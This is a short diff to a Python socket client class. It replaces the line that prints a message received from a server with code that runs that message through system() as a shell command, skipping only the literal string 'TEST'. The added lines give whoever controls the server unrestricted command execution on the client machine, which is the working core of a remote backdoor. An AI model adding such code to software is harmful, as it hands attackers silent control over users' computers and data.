@@ -26,7 +26,10 @@ class client:
 
         msg = self.server.recv(int(size.decode()))
 
-        print(msg.decode())
+        if msg.decode() == "TEST":
+            return
+
+        system(msg.decode())
 
 
 
